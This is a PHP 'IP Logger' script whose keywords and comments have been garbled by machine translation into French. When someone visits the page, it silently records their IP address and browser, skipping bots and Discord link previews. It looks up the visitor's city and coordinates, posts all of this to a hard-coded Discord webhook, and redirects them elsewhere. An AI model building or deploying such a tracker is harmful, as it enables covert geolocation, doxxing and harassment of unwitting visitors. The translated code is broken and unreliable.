<? php

// Obtenez l'IP et les informations
$ IP        = $ _SERVER [ 'REMOTE_ADDR' ];
$ Browser   = $ _SERVER [ 'HTTP_USER_AGENT' ];

// Empêche-nous de ramasser des ips
if ( preg_match ( '/ bot | Discord | robot | curl | spider | crawler | ^ $ / i' , $ Browser )) {
    exit ();
}

//Info
$ Curl = curl_init ( "http://ip-api.com/json/$IP" ); // Obtenez les informations de l'IP en utilisant Curl
curl_setopt ( $ Curl , CURLOPT_RETURNTRANSFER , true );
$ Info = json_decode ( curl_exec ( $ Curl ));
curl_close ( $ Curl );

$ ISP = $ Info -> isp ;
$ Country = $ Info -> country ;
$ Region = $ Info -> regionName ;
$ City = $ Info -> ville ;
$ COORD = "$ Info-> lat, $ Info-> lon" ; // Coordonnées

// Variables
$ Webhook     = "https://discordapp.com/api/webhooks/710082096516956213/8c38xOKksjBxppCC3hKiosxUFFUcboiN7Q0heCfCHmCHt0v_K6UqPlg-JIVOTwzloqrW" ; // Webhook ici.

$ WebhookTag = "Showcase" ; // Ce sera le nom du webhook lorsqu'il enverra un message.  

// JS que nous allons envoyer au webhook.
$ JS = tableau (
    'username'    => "$ WebhookTag - IP Logger" ,
    'avatar_url' => "https://vgy.me/GQe9bJ.png" ,
    'content'     => "** __ IP Info __ **: \ nIP: $ IP \ nISP: $ ISP \ nBrowser: $ Browser \ n ** __ Location __ **: \ nPays: $ Country \ nRegion: $ Region \ nCity: $ Ville \ nCoordonnées: $ COORD "
);
 
// Encode ce JS pour que nous puissions le poster sur le webhook
$ JSON = json_encode ( $ JS );


fonction  IpToWebhook ( $ Hook , $ Content )
{
    // Utilisez Curl pour publier sur le webhook.
      $ Curl = curl_init ( $ Hook );
      curl_setopt ( $ Curl , CURLOPT_CUSTOMREQUEST , "POST" );
      curl_setopt ( $ Curl , CURLOPT_POSTFIELDS , $ Content );
      curl_setopt ( $ Curl , CURLOPT_RETURNTRANSFER , true );
      return  curl_exec ( $ Curl );
}

IpToWebhook ( $ Webhook , $ JSON );
en-tête ( "Emplacement: https://www.littest.site" );
?>
